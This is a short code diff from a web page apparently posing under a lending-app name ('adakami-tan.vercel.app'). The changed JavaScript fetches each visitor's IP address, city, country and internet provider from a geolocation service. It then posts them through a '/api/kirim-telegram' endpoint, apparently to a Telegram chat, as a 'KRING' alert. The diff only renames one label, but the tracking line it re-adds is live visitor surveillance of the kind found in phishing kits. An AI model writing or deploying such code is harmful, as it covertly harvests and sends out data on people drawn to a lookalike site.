@@ -448,7 +448,7 @@
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    const infoPesan = `<b>🚀 KRING... KRING... KRING...</b>\n\n<b>Linkk:</b> https://adakami-tan.vercel.app/\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+                    const infoPesan = `<b>🚀 KRING... KRING... KRING...</b>\n\n<b>Domain:</b> https://adakami-tan.vercel.app/\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
